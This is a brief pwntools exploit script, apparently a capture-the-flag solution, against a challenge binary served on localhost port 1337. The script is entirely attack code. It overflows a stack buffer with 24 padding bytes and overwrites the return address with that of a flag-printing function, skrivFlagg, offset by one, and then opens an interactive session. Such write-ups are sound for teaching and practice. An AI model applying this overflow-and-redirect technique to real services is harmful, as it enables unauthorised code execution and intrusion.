from pwn import *

elf = context.binary = ELF("./chall")

#io = process()
io = remote("localhost", 1337)

#gdb.attach(io,gdbscript="""
#c
#""")

io.sendline(b'H')
io.sendline(b'a'*24 + p64(elf.sym.skrivFlagg+1))
io.interactive()